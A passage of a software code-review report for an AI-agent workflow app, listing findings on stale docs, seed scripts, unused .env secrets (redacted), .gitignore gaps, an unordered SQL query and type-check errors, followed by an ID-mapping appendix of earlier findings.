- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-17
- **Related:** CR-264 (TOOL-21)
- **Location:** `README.md:9-10`, `README.md:16`, `README.md:57-62`, `README.md:69-75`, `README.md:89`, `README.md:138-139`, `README.md:146`, `README.md:153`, `README.md:165-166`, `README.md:261`
- **Problem:**
  1. The `.env` table documents `CURSOR_API_KEY` and `JIRA_*`, but `lib/config.ts` and `.env.example` say credentials live in the DB, and `cursorApiKey()` has "no env fallback".
  2. `/tasks/import` doesn't exist; there is no `app/**/tasks` page.
  3. `components/panels/` became `components/flows/panels/`.
  4. `app/page.tsx` and `app/settings/page.tsx` became `app/(workspace)/...`.
  5. `lib/integrations/cursor/cursorSdk.ts` became `lib/integrations/cursorSdk.ts`.
  6. The `GITLAB_BASE_URL/TOKEN` env fallback has no references in code.
  7. AppConfig has no `jira` group.
  8. Lines 10 and 16 describe local mode via the `cursor-agent` CLI, while line 277 says it runs in-process via `@cursor/sdk`.
  9. The demo-seed section omits `seed:branch-refine`.
- **Evidence:**
  ```
  README.md:73  | `CURSOR_API_KEY` | Cursor dashboard → API Keys. Powers every agent node. |
  README.md:89  2. **Import tasks** on the task import screen (`/tasks/import`) ...
  lib/integrations/cursor/credentials.ts:7  (DB). There is no env fallback — the key lives only in the settings store.
  ```
- **Suggested fix:** Replace the `.env` table with the real keys (`DATABASE_PATH`, `WORKSPACE_DIR`, `DEFAULT_MODEL`, `GITLAB_WEBHOOK_SECRET`) and a pointer to Settings → Integrations. Fix the listed paths and routes, unify the local-mode description on the SDK, and list all `seed:*` scripts.
- **Effort:** S

### CR-261 [Low] AGENTS.md seed command variants don't match `package.json`

- **Status at `abaa007`:** **Open**, fix in [Task 56](review-tasks/56-docs-refresh.md)
- **Current location:** AGENTS.md:17,32, package.json:5-12
- **Re-verification note:** The mismatch has widened. AGENTS.md §0 still says `npm run seed:demo` (with variants) and §1 names `seed:demo:reset`, but package.json no longer defines any seed script, so the documented command fails. Update §0 to the real invocation (`node scripts/seed-*.mjs`, or re-add npm scripts), and reword §1 to cover every seed script with a reset mode.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-18
- **Location:** `AGENTS.md:17`, `package.json:10-17`
- **Problem:** AGENTS.md says `seed:demo` has variants `:reset, fanout, branch-refine, custom`, which reads as `seed:demo:branch-refine` and `seed:demo:custom`. The real names are `seed:branch-refine[:reset]` and `seed:custom[:reset]`. The Safety rule mentions only `seed:demo:reset`, but all four `*:reset` scripts are destructive.
- **Evidence:**
  ```
  AGENTS.md:17  npm run seed:demo # seed demo data (variants: :reset, fanout, branch-refine, custom)
  package.json  "seed:branch-refine", "seed:custom", "seed:demo:fanout:reset", ...
  ```
- **Suggested fix:** List the exact script names. Reword §1 to "any `seed:*` or `*:reset` script".
- **Effort:** S

### CR-262 [Low] Seed scripts duplicate boilerplate and hand-replicate engine logic

- **Status at `abaa007`:** **Partly fixed** (Task 06 — shared `openSeedDb`, time/id helpers, cascade reset; engine replicas remain — finish in Task 56 / CR-261)
- **Current location:** scripts/seed-demo-flow.mjs:30-35,151-195,227, scripts/seed-demo-fanout.mjs:41,64-66,128, scripts/seed-branch-refine-demo.mjs:42-47,158-159,270, scripts/seed-custom-flow.mjs:37-42,65, scripts/seed-split-smoke.mjs:50,68, scripts/lib/seed-db.mjs
- **Re-verification note:** All seed scripts now share only `resolveSeedDb` from scripts/lib/seed-db.mjs. Each still re-declares the WAL/schema bootstrap, `now` / `minsAgo` / `uid` and `reset()`. seed-demo-flow still carries engine replicas of `syncStepsFromPlan` / `markStepsDone` and a hand-copied `createFlow` INSERT, and seed-branch-refine-demo replicates `mergeBranchRefine` from plan-node. Move the shared helpers into scripts/lib/seed-db.mjs, and long term seed through the real `PlanStepStore` / `FlowEngine` APIs (for example as TS scripts or vitest fixtures) instead of replicas.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-19
- **Related:** CR-041 (NODE-43, DATA-25, TOOL-03); CR-159 (TOOL-06)
- **Location:** `scripts/seed-demo-flow.mjs:26-35,151-193`, `scripts/seed-demo-fanout.mjs:38-66`, `scripts/seed-branch-refine-demo.mjs:32-40,198`, `scripts/seed-custom-flow.mjs:28-42`
- **Problem:** Each script re-declares the DB open/WAL/schema bootstrap, `now`/`minsAgo`/`uid`, and `reset()`. `seed-demo-flow.mjs` carries "engine replicas" of `syncStepsFromPlan`, `markStepsDone` and `setStepStatus` copied from `lib/engine/steps.ts`, plus an INSERT that "mirrors lib/engine/flow.createFlow". Any engine change silently produces seed data the real engine would never create. TOOL-06 (CR-159) is one concrete instance of this drift.
- **Evidence:**
  ```
  seed-demo-flow.mjs:151  // ── engine replicas (syncStepsFromPlan / markStepsDone from lib/engine/steps) ─
  seed-demo-flow.mjs:227  // ── flow (mirrors lib/engine/flow.createFlow) ──
  (now/minsAgo/uid defined identically in 4 files)
  ```
- **Suggested fix:** Move the shared helpers (`openSeedDb`, `now`/`minsAgo`/`uid`, `deleteFlowCascade`) into `scripts/lib/seed-db.mjs`. Longer term, once a TS runner exists (TOOL-03 (CR-041)/07), seed through the real `PlanStepStore` and `FlowEngine` APIs instead of replicas.
- **Effort:** M

### CR-263 [Low] `sentry-triage.yaml` declares `trigger.type: webhook`, which import silently coerces to `manual`

- **Status at `abaa007`:** **Fixed** (Task 07 — fixture uses `manual`; unknown flow trigger types fail import)
- **Re-verification note:** This only concerns a fixture written in a legacy data shape (flow `trigger.type: webhook`, removed from `FLOW_TRIGGER_TYPES` in lib/engine/constants/triggers.ts:8) and the silent legacy coercion to "manual" in lib/engine/templates/template-store.ts:922-923. Both still exist. Possible delete-legacy cleanup: switch docs/flow-templates/sentry-triage.yaml:4-11 to `type: manual` and make unknown trigger types an import error instead of coercing them.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-20
- **Related:** CR-164 (TOOL-11)
- **Location:** `docs/flow-templates/sentry-triage.yaml:4-11`, `lib/engine/templates.ts:25`, `lib/engine/templates.ts:978-981`
- **Problem:** `FLOW_TRIGGER_TYPES` is `["manual", "schedule"]`. `flowTrigger()` maps `webhook` to `manual`; webhooks are always-on via the hook endpoint, and the `filter` is preserved, so it still works. The fixture and its header comment ("flow-trigger section (shown when webhook is picked)") describe a UI choice that no longer exists, and a re-export won't round-trip the file.
- **Evidence:**
  ```
  sentry-triage.yaml:11   type: webhook
  templates.ts:25         export const FLOW_TRIGGER_TYPES = ["manual", "schedule"] as const;
  templates.ts:980-981    ... includes(rec.type) ? rec.type : "manual";
  ```
- **Suggested fix:** Change the fixture to `type: manual` (keeping `filter`) and update the header comment. Optionally make unknown flow-trigger types a lint error.
- **Effort:** S

### CR-264 [Low] Local `.env` holds live integration secrets the app no longer reads

- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
- **Current location:** .env:3,6-8,11-12 (gitignored, never committed)
- **Re-verification note:** The local .env still defines `CURSOR_API_KEY`, `JIRA_BASE_URL`, `JIRA_EMAIL`, `JIRA_API_TOKEN`, `GITLAB_BASE_URL` and `GITLAB_TOKEN` (values not printed). No code in lib/, app/ or scripts/ reads them; cursorSdk always passes the DB `apiKey`. The @cursor/sdk env fallback still makes the stray `CURSOR_API_KEY` a latent risk. Remove these keys once they are stored in Settings → Integrations, and rotate them if the file was ever shared.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-21
- **Related:** CR-117 (DATA-27); CR-260 (TOOL-17)
- **Location:** `.env:12-15` (gitignored, never committed: `git log --all -- .env` is empty)
- **Problem:** `.env` contains `CURSOR_API_KEY`, `JIRA_BASE_URL`, `JIRA_EMAIL` and `JIRA_API_TOKEN` with real-looking values; values were not printed. No app code reads them: credentials come from the DB, and `cursorSdk.ts:97-100` throws when the DB key is empty. `@cursor/sdk` itself falls back to `process.env.CURSOR_API_KEY` when `apiKey` is undefined (`node_modules/@cursor/sdk/dist/esm/index.js`), so any future SDK call that omits `apiKey` would silently use this key. README (TOOL-17 (CR-260)) still tells users to put the secrets there.
- **Evidence:**
  ```
  .env: CURSOR_API_KEY=crs***  JIRA_API_TOKEN="AT***   (values redacted)
  lib/integrations/cursor/credentials.ts:7  There is no env fallback
  @cursor/sdk: function u(t){return void 0!==t?t:process.env.CURSOR_API_KEY ?? ...}
  ```
- **Suggested fix:** Delete these keys from `.env` once they are stored in Settings → Integrations, and rotate them if the file was ever shared. Fix the README table (TOOL-17 (CR-260)).
- **Effort:** S

### CR-265 [Low] `.gitignore` only ignores the literal `.env`

- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
- **Current location:** .gitignore:3
- **Re-verification note:** Only the literal `.env` is ignored, so `.env.local`, `.env.production`, `.env.*.local` and similar files could still be committed. Replace it with `.env*` plus `!.env.example`.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-22
- **Location:** `.gitignore:3`
- **Problem:** Next also loads `.env.local`, `.env.production`, `.env.development.local` and similar files. None of them is ignored, so a developer following Next conventions could commit secrets.
- **Evidence:**
  ```
  .gitignore:3  .env
  ```
- **Suggested fix:** Add `.env*` and `!.env.example`.
- **Effort:** S

### CR-266 [Low] `package.json` has no `engines` field, even though local mode requires Node ≥ 22.13; the `shadcn` CLI is a runtime dependency

- **Status at `abaa007`:** **Fixed** — `"engines": { "node": ">=22.13" }`, `engine-strict=true` in `.npmrc`; `shadcn`, `tailwindcss`, and `@tailwindcss/postcss` moved to `devDependencies` (PR link pending)
- **Current location:** package.json:13-48, .npmrc:1, app/globals.css:2, README.md:277
- **Re-verification note:** There is still no `engines` field (Node >= 22.13 is required by @cursor/sdk local mode) and no `engine-strict` in .npmrc. `shadcn` (CLI, used only for the `shadcn/tailwind.css` import), `tailwindcss` and `@tailwindcss/postcss` are still runtime dependencies. Add `"engines": { "node": ">=22.13" }`, move build-only packages to devDependencies, or vendor the CSS.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-23
- **Location:** `package.json:1-66`, `README.md:277`, `app/globals.css:2`
- **Problem:** README and `cursorSdk.ts` require Node ≥ 22.13 for the SDK, but nothing enforces it at install time. The `shadcn` CLI package sits in `dependencies` and is used only for `@import "shadcn/tailwind.css"`. `@tailwindcss/postcss` and `tailwindcss` (build-time) are also in `dependencies`.
- **Evidence:**
  ```
  README.md:277   ... Auth comes from `CURSOR_API_KEY` (the SDK requires Node 22.13+).
  app/globals.css:2  @import "shadcn/tailwind.css";
  ```
- **Suggested fix:** Add `"engines": { "node": ">=22.13" }` (plus `engine-strict=true` in `.npmrc` if desired). Move build-only packages to `devDependencies`, or vendor the shadcn CSS.
- **Effort:** S

### CR-267 [Low] `check-worktrees.ts` leaks its temp workspace on failure

- **Status at `abaa007`:** **Open**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
- **Current location:** scripts/check-worktrees.ts:84,703-715
- **Re-verification note:** The `mkdtemp` workspace is still removed only on the success path of `all()`, so any failure exits through `.catch` with the directory left behind. Wrap the body of `all()` in try/finally around `fs.rmSync(tmp, …)`, or port the check to vitest with `afterAll` cleanup.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-24
- **Location:** `scripts/check-worktrees.ts:84`, `scripts/check-worktrees.ts:703-715`
- **Problem:** The `mkdtemp` directory (git repos, worktrees, SQLite DB) is removed only on the success path of `all()`. Any assertion failure exits with the directory left behind. Deletion is correctly scoped to the `mkdtemp` path, so this is not a safety issue.
- **Evidence:**
  ```
  84:  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "devflow-wt-"));
  708:   fs.rmSync(tmp, { recursive: true, force: true });   // only on success
  712: all().catch((e) => { console.error(e); process.exit(1); });
  ```
- **Suggested fix:** Wrap `all()` in `try/finally` around the `rmSync`, or move cleanup into `afterAll` when ported to the test runner.
- **Effort:** S

### CR-268 [Low] Design and plan docs reference files that no longer exist

- **Status at `abaa007`:** **Open**, fix in [Task 56](review-tasks/56-docs-refresh.md)
- **Current location:** docs/phase0-baseline.md, docs/pristine-plan.md, docs/tasks-plan.md, docs/custom-flows-plan.md, docs/worktree-support.md, docs/prompt-flow-fix-plan.md, docs/plan-conversation-refine.md, docs/node-definition-refactor-plan.md, docs/step-sub-flows-plan.md, docs/worktree-ensure-impl-plan.md, docs/worktree-ensure-runner.md, docs/refinement-plan.md, docs/template-editor-ux-plan.md, docs/prompt-flow-inconsistencies.md, eslint.config.mjs:38,92
- **Re-verification note:** Re-checked against current docs/: 14 docs now cite ~100 backticked paths that don't exist (~70 genuine full-path misses, vs 17 at review time), because of the renames (lib/engine/flow.ts, templates.ts, nodes/base/*, jsonata-eval.ts, components/flows/plan/*). Some newly added docs are already stale, docs/pristine-plan.md still links docs/ai-elements-migration.md (missing) and docs/repo-detail-page.md (now only in docs/archive/), and eslint.config.mjs still cites phase0-baseline.md (28 stale refs) as its verification source. Move completed plan docs to docs/archive/ with a "paths may be stale" banner, and refresh phase0-baseline.md or repoint the lint comments to docs/architecture/.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-25
- **Location:** `docs/custom-flows-plan.md`, `docs/pristine-plan.md`, `docs/tasks-plan.md`, `docs/phase0-baseline.md`, `docs/refinement-plan.md`, `docs/template-editor-ux-plan.md`, `docs/worktree-support.md`
- **Problem:** A mechanical check of backticked paths found 17 missing targets. Examples: `components/NodePanel.tsx`, `components/WorkflowGraph.tsx`, `components/panels/registry.tsx`, `lib/integrations/gitlab.ts`, `lib/integrations/jira.ts`, `lib/integrations/localAgent.ts`, `app/api/tickets/route.ts`, `app/page.tsx`, `types/format.ts`, and the missing docs `docs/ai-elements-migration.md` and `docs/repo-detail-page.md`. `eslint.config.mjs` comments cite `docs/phase0-baseline.md` as the verification source for the client allowlist, and that doc is partly stale.
- **Evidence:**
  ```
  docs/pristine-plan.md: missing components/panels/registry.tsx
  docs/tasks-plan.md: missing app/api/tickets/route.ts
  docs/worktree-support.md: missing lib/integrations/localAgent.ts
  docs/phase0-baseline.md: missing types/format.ts
  ```
- **Suggested fix:** Move completed plan docs into `docs/archive/` (already exists) with a "historical, paths may be stale" banner. Keep only living docs at the top level. Update `phase0-baseline.md` if lint comments keep citing it.
- **Effort:** S

## Findings: New at `abaa007` (5)

Found while re-verifying. Numbered after the original items.

### CR-269 [Medium] Chat-only replies run inside `bg()`, so an agent error flips a finished node to `failed`

- **Status at `abaa007`:** **Fixed** ([Task 16](review-tasks/16-run-lifecycle-late-writes.md))
- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib (ENG)
- **Source:** re-verification (NEW-B1)
- **Location:** lib/engine/flow-engine.ts:598-615,1726-1746, lib/engine/nodes/shared/agent-run-node.ts:81-105, lib/engine/harness/agent-runner.ts:171-182
- **Problem and suggested fix:** The chat-only ("just chat") path claims to leave node state untouched, but `sendChat` runs it through `bg(flowId, nodeKey, …)`, whose catch sets the node to `failed`. Any agent start or stream error during a question therefore flips an `approved`/`done`/`awaiting_approval` node to `failed`. Also, because `converse()` uses `executeRun` on a non-running node, every successful reply emits a misleading "result arrived after the node was already … — ignoring" lifecycle event. Run the chat-only branch with `bg(flowId, null, …)`, or catch and reply with the error, and give `executeRun` a converse mode that skips the late-write guard event.
- **Effort:** S

### CR-270 [High] `NodeSupport.artifactsOfKind` has no `ORDER BY`, so "latest plan" reads return an arbitrary (oldest) version

- **Status at `abaa007`:** **Fixed** — `ORDER BY a.version DESC, a.created_at DESC` in `NodeSupport.artifactsOfKind`; regression test in `lib/engine/nodes/shared/node-support.test.ts` (PR link pending)
- **Severity:** High
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes (NODE)
- **Source:** re-verification (NEW-C1)
- **Location:** lib/engine/nodes/shared/node-support.ts:120-149 (consumers: lib/engine/nodes/kinds/build/build-node.ts:175, 358, 412; lib/engine/nodes/kinds/build/step-build-node.ts:291; lib/engine/nodes/kinds/plan/plan-store.ts:32; lib/engine/nodes/kinds/plan/plan-context.ts:125)
- **Problem and suggested fix:** `artifactsOfKind` is documented as "newest first", but its SQL has no `ORDER BY a.version DESC`, so `latestArtifact(...)` returns the OLDEST version (checked against schema.sql in an in-memory DB: three plan versions give v1). Meanwhile `FlowEngine.latestResourceArtifact` (flow-engine.ts:903-910) orders correctly. As a result, approve marks vN approved while the build builds plan v1; `PlanStore.latestPlan` feeds stale v1 meta into turn routing, scoped refines and split units (a branch refine merges into v1 and drops later revisions); and the previous-versions context block shows the oldest three. Fix: add `ORDER BY a.version DESC, a.created_at DESC` to both branches (which are also identical apart from the bound param) and add a NodeSupport test with multiple versions.
- **Effort:** S

### CR-271 [Medium] Chat send failures are never shown to the user

- **Status at `abaa007`:** **Fixed** ([Task 15](review-tasks/15-frontend-mutation-conventions.md))
- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI (FLOWUI)
- **Source:** re-verification (NEW-D1)
- **Location:** components/chat/ChatPanel.tsx:117-123, components/chat/ChatPanel.tsx:195-200, components/chat/hooks/useChatComposer.ts:61-65, components/chat/components/chatComposerForm/ChatComposerForm.tsx:143-151, components/flows/panels/NodeChat.tsx:17-29, components/flows/components/plan/PlanNodeChat.tsx:46-62
- **Problem and suggested fix:** Chat send failures are invisible. `useChatComposer` returns `error`, but `ChatPanel` only takes `sendMessageMutation` and `isPending`; neither `NodeChat` nor `PlanNodeChat` passes `sendError`; and `ChatComposerForm` swallows the rejection (`.catch(() => {})`). A failed `POST /chat` (run start rejected, 4xx or 5xx) therefore just re-enables the textarea with no message or retry. Fix: have `ChatPanel` render `useChatComposer().error?.message` as the send error (with `reset()` on the next edit), and drop the now-unused `sendError` prop.
- **Effort:** S

### CR-272 [Low] `seed-split-smoke --reset` throws a foreign-key error when smoke flows exist

- **Status at `abaa007`:** **Fixed** (Task 06 — reset cascades task flows before deleting the task)
- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config (TOOL)
- **Source:** re-verification (NEW-E1)
- **Location:** scripts/seed-split-smoke.mjs:263-268, scripts/seed-split-smoke.mjs:191-197, lib/db/schema.sql:22
- **Problem and suggested fix:** The new `seed-split-smoke --reset` keeps the template when flows reference it, but then unconditionally runs `DELETE FROM tasks WHERE id=TASK_ID`. `flows.task_id REFERENCES tasks(id)` and better-sqlite3 enforces FKs by default, so the reset throws SQLITE_CONSTRAINT_FOREIGNKEY whenever a smoke flow exists. Fix: delete the task's flows through the shared cascade helper from CR-159 first, or skip the task delete with a message, as the template branch does.
- **Effort:** S

### CR-273 [Medium] `tsc --noEmit` fails with 11 errors in tests and scripts, and no script runs it

- **Status at `abaa007`:** **Fixed** — test/script type errors resolved; `npm run typecheck` and `npm run check` added (PR link pending)
- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 7b — Tooling & config (TOOL)
- **Source:** re-verification (NEW-H1)
- **Location:** tests/plan-diff.test.ts:72,87 (2 errors), lib/engine/runtime/split/split-manager.test.ts:234-236 (3), lib/engine/templates/split-smoke-template.test.ts:300,336-344 (4), lib/engine/nodes/kinds/plan/plan-split-units-demo.test.ts:154 (1), scripts/verify-prompt-parity.ts:214 (1), tsconfig.json:21
- **Problem and suggested fix:** `npx tsc --noEmit` (with or without the incremental cache) currently reports 11 errors in 5 files, not just the single plan-diff error. Vitest doesn't type-check, so `npm test` stays green, and because tsconfig `include` covers `**/*.ts`, these files are also in the program `next build` type-checks. Fix the 11 errors, and add a `typecheck` script (`tsc --noEmit`) to package.json and the DoD so test and script type drift fails fast.
- **Effort:** S

## Appendix: original ID to CR ID

Every one of the 284 original finding IDs appears exactly once below.

| Original ID | CR ID | Merged with | Original severity | Original title |
| --- | --- | --- | --- | --- |
| APP-01 | CR-001 | — | Critical | State-changing API has no auth, CSRF or Origin check, so any website can make DevFlow run shell commands |
| APP-02 | CR-002 | — | High | The instance "test" endpoints send the stored token to a caller-supplied `baseUrl` |
| APP-03 | CR-003 | — | High | No Zod validation at any API boundary, so bad bodies cause 500s or get saved |
| APP-04 | CR-004 | — | High | The prompt preview shows a different local-mode build prompt from the one the build node sends |
| APP-05 | CR-005 | — | High | The template editor SSR seeds the shared `queryKeys.repos` cache with a different data shape |
| APP-06 | CR-042 | — | Medium | `update_plan_steps` with no `steps` field deletes the whole plan checklist |
| APP-07 | CR-043 | — | Medium | The generic webhook records a delivery as seen before dispatching it, so failed deliveries are lost on retry |
| APP-08 | CR-044 | — | Medium | The GitLab webhook parses the body before auth and has no error handling around engine calls |
| APP-09 | CR-045 | — | Medium | GET handlers and server loaders start the poller and run the reconciler as side effects |
| APP-10 | CR-046 | ENG-28 | Medium | Errors map to the wrong HTTP statuses, and some routes have no error handling at all |
| APP-11 | CR-047 | — | Medium | The events endpoint does not validate `limit` |
| APP-12 | CR-114 | DATA-23 | Medium | `DELETE /api/repos/:id` returns an unhandled 500 when a flow references the repo |
| APP-13 | CR-048 | — | Medium | Settings PATCH writes some fields and then rejects later ones |
| APP-14 | CR-049 | — | Medium | The prompt preview route is a 230-line switch on node key instead of a registry method |
| APP-15 | CR-050 | — | Medium | Template save creates draft node templates in the route, with a manual, non-transactional rollback |
| APP-16 | CR-051 | — | Medium | Routes run raw SQL and domain logic instead of calling service methods |
| APP-17 | CR-052 | — | Medium | The Settings pages are client components that fetch their data on the client |
| APP-18 | CR-053 | — | Medium | Node-template responses are serialized differently in different places, and the create/update responses lack `is_local` |
| APP-19 | CR-108 | DATA-17 | Low | The events cursor (`id > after`) can skip events written in the same millisecond |
| APP-20 | CR-167 | — | Low | The four repo routes duplicate their input helpers, and `~` expansion is wrong |
| APP-21 | CR-168 | — | Low | Loaders and routes build the same payloads separately, and one copy has already drifted |
| APP-22 | CR-169 | — | Low | Domain strings are repeated as literals instead of named constants |
| APP-23 | CR-170 | — | Low | No DB-touching route declares `runtime = "nodejs"` |
| APP-24 | CR-171 | — | Low | The artifact GET crashes with a 500 on malformed `meta` JSON |
| APP-25 | CR-172 | — | Low | `GET /api/graph` falls back to a default graph for unknown flow or template ids |
| APP-26 | CR-173 | — | Low | Type escape hatches: double casts, an unchecked downcast, and type imports from a component barrel |
| APP-27 | CR-174 | — | Low | Six identical error boundaries and three copies of `TableSkeleton` |
| APP-28 | CR-175 | — | Low | `tasks/live` keeps its cache in module-level mutable state |
| APP-29 | CR-176 | — | Low | The hook payload cap is checked after the whole body is buffered, and counts characters instead of bytes |
| APP-30 | CR-177 | — | Low | Auto-naming in `POST /api/node-templates` can race and fail on the unique key |
| APP-31 | CR-178 | — | Low | Worktree status lists worktrees once per flow instead of once per repo |
| APP-32 | CR-179 | — | Low | The template editor's SSR QueryClient defaults are a hand-copied, already-divergent version of the app provider's |
| ENG-01 | CR-006 | — | High | Timer and comment-debounce waits are memory-only, so a restart strands `waiting` nodes forever |
| ENG-02 | CR-007 | — | High | Loop re-entry never resets `skipped` nodes, so the second iteration deadlocks on a previously skipped branch |
| ENG-03 | CR-008 | — | High | Merge-arena lock is per integration branch, but all branches of a parent share one working directory |
| ENG-04 | CR-009 | — | High | Fan-out rollup is not idempotent: it can publish twice and can regress an already-finished parent node |
| ENG-05 | CR-010 | — | High | `skipFanoutStep` drops the promise of async `skipStepFlow`: errors are unhandled and the API reports success |
| ENG-06 | CR-011 | — | High | Poller compares each branch's pipeline against the flow-wide last `pipeline` event, re-triggering the gate every tick |
| ENG-07 | CR-012 | DATA-29 | High | No multi-step DB write in the engine is atomic |
| ENG-08 | CR-013 | — | High | Plan-checklist bulk edit reopens done steps and drops agent `meta_id`, so the next refine duplicates the checklist |
| ENG-09 | CR-054 | — | Medium | Node start guards are check-then-act, and `startPlan`/`refinePlan`/`sendChat` have no guard at all |
| ENG-10 | CR-055 | — | Medium | `approvePlan` does not check the plan node's status, so approving during a refine silently discards the refine |
| ENG-11 | CR-056 | — | Medium | `cancelNode` has no status guard and does not stop cloud runs |
| ENG-12 | CR-057 | — | Medium | A double approve of a code step child starts a second merge loop that flips the merged step to `failed` |
| ENG-13 | CR-058 | — | Medium | Step-child code assumes one node per child flow, but explicit child templates can have several |
| ENG-14 | CR-059 | — | Medium | `mergeArena` is a plain module singleton even though it holds process state that reconcile relies on |
| ENG-15 | CR-060 | — | Medium | Poller ticks can overlap, and non-MR steps of the tick run outside any try/catch |
| ENG-16 | CR-061 | — | Medium | Floating promises and mistyped async signatures in the fan-out path and `bg()` |
| ENG-17 | CR-062 | — | Medium | Template validation has no cycle detection on `next` edges |
| ENG-18 | CR-063 | — | Medium | Validator accepts edge shapes the runtime silently ignores (labels on non-decision edges, conditions on decision edges) |
| ENG-19 | CR-064 | — | Medium | Auto-wrap template lookup can never match, so every fan-out expansion creates a new hidden template and inbound hook |
| ENG-20 | CR-065 | — | Medium | Flows read the live template graph, so the "snapshot" guarantee is only partly true |
| ENG-21 | CR-066 | — | Medium | Flow `delete()` does not stop in-flight work or clear in-memory engine state |
| ENG-22 | CR-067 | — | Medium | Failed YAML import "rollback" deletes pre-existing node templates it merely reused |
| ENG-23 | CR-068 | — | Medium | SSRF guard forwards all request headers, secrets included, across cross-host redirects |
| ENG-24 | CR-069 | DATA-08 | Medium | GitLab webhook authentication is fail-open when `GITLAB_WEBHOOK_SECRET` is unset |
| ENG-25 | CR-023 | DATA-03 | Medium | Merge arena persists the token-bearing clone URL on disk and stores git stderr unredacted |
| ENG-26 | CR-070 | — | Medium | `FlowEngine` is a god class with about ten responsibilities in 1,800 lines |
| ENG-27 | CR-071 | — | Medium | Engine classes embed raw SQL instead of going through row mappers and stores |
| ENG-28 | CR-046 | APP-10 | Medium | Engine throws untyped `Error` everywhere, so routes cannot distinguish 404, 409 and 400 |
| ENG-29 | CR-072 | — | Medium | `current_node` pointer lifecycle is inconsistent (never cleared, or cleared unconditionally) |
| ENG-30 | CR-073 | — | Medium | Worktree lifecycle events stamp the node row id as `nodeKey`, misrouting them in the feed |
| ENG-31 | CR-180 | — | Low | Status and flow-kind values are raw string literals throughout the engine |
| ENG-32 | CR-181 | — | Low | Built-in def keys hard-coded as strings despite the "no node-key constants" design and the existing `NODE_KEYS` |
| ENG-33 | CR-182 | — | Low | `any` types in poller, groupEvents, steps, the Jira provider and the SSRF guard |
| ENG-34 | CR-183 | — | Low | Non-null `!` assertions on data that may be missing |
| ENG-35 | CR-184 | — | Low | Duplicated logic inside `FlowEngine` |
| ENG-36 | CR-185 | — | Low | `FlowEngine.get()` performs N+1 queries per request |
| ENG-37 | CR-186 | — | Low | `secrets.ts` is a loose-function module holding unrelated responsibilities |
| ENG-38 | CR-187 | — | Low | Dead code and no-ops |
| ENG-39 | CR-188 | — | Low | SSRF helper throws `SsrfReason`, not `SsrfError`, so callers see two error types for one policy |
| ENG-40 | CR-189 | — | Low | SSRF guard has no DNS timeout and only an idle socket timeout |
| ENG-41 | CR-190 | — | Low | IPv6 literal URLs never match the IP-literal path, because `URL.hostname` keeps the brackets |
| ENG-42 | CR-191 | — | Low | YAML export emits edge endpoints unquoted, so node keys `true`/`false`/`null` break the round-trip |
| ENG-43 | CR-192 | — | Low | Checklist bulk replace moves protected (started) steps to the top |
| ENG-44 | CR-193 | — | Low | Schedule triggers drift and are interval-only |
| ENG-45 | CR-107 | DATA-16 | Low | Worktree ensure de-dup key includes the branch, while the worktree directory is per flow |
| ENG-46 | CR-194 | — | Low | Unbounded in-memory maps in long-lived singletons |
| ENG-47 | CR-195 | TPL-27 | Low | Server engine imports from `components/` (layering inversion) |
| ENG-48 | CR-196 | — | Low | Shared-secret webhook fallback has no replay protection |
| ENG-49 | CR-197 | — | Low | `EventGrouper.group` mutates the caller's event objects |
| ENG-50 | CR-198 | — | Low | Jira materialization uses the provider's numeric issue id as the global `tasks.id` |
| NODE-01 | CR-014 | — | High | When the late-write guard fires, callers still finalize, which brings cancelled nodes back and overwrites state |
| NODE-02 | CR-015 | — | High | Runs have no attempt identity, so overlapping attempts on one node both treat it as theirs |
| NODE-03 | CR-016 | — | High | The script node passes the server's whole `process.env` to user scripts, contrary to its "allowlisted env" contract |
| NODE-04 | CR-017 | — | High | Multi-branch resolve picks up and resolves comments from every MR in the flow |
| NODE-05 | CR-018 | — | High | A plan refine from chat drops `complex`, which wipes a complex plan's branches |
| NODE-06 | CR-019 | — | High | MR creation forces the pipeline and review nodes to `pending` even while they are running, and throws when they don't exist |
| NODE-07 | CR-020 | — | High | For multi-branch flows, the commit-fix agent runs on the wrong branch |
| NODE-08 | CR-074 | — | Medium | Per-branch cost attribution never applies: `tagLatestRun` runs after the run row is already closed |
| NODE-09 | CR-075 | — | Medium | Pipeline gate treats "stale head", "API error" and "no pipeline" as the same thing, so it triggers duplicate pipelines |
| NODE-10 | CR-076 | — | Medium | Built-in nodes never validate their config against `configSchema` at run time |
| NODE-11 | CR-077 | — | Medium | Declarative nodes silently drop *all* instance config when any field is invalid |
| NODE-12 | CR-078 | — | Medium | Decision manual picks and legacy expression picks are checked against the catalog choices, not the instance's |
| NODE-13 | CR-079 | — | Medium | Decision `jsonataTruthy` doesn't follow JSONata truthiness, so empty arrays and objects pick a branch |
| NODE-14 | CR-080 | — | Medium | Agent node with `output: json` and no schema always fails |
| NODE-15 | CR-081 | — | Medium | `converse()` (chat-only) always trips the late-write guard: it logs a spurious "ignoring" event and hides run errors |
| NODE-16 | CR-082 | — | Medium | A failure in stream or usage capture leaves the run row `running` and fails an agent run that finished |
| NODE-17 | CR-083 | — | Medium | Multi-branch MR, pipeline, review and resolve derive the git branch without the build's `branch_pattern` |
